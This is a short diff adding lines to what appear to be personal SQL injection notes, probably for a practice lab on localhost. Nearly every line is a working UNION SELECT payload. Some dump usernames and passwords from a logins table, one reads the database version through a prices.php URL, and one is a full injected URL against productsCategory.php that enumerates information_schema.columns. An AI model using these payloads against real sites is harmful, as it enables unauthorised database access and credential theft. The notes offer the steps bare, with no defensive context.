@@ -39,3 +39,14 @@ union select column_name, table_name, table_schema from information_schema.colum
 step 4
 dump relevant databases
 union select user, pass, 3 from userinfo.logins;#
+
+union select username, password, 3 from information_schema.columns;#
+
+www....com\prices.php?item=4 UNION SELECT 1,2,@@version
+
+
+
+
+
+
+http://localhost:30103/cases/productsCategory.php?category=1%20union%20select%20column_name,%20table_name,%20table_schema%20from%20information_schema.columns;#
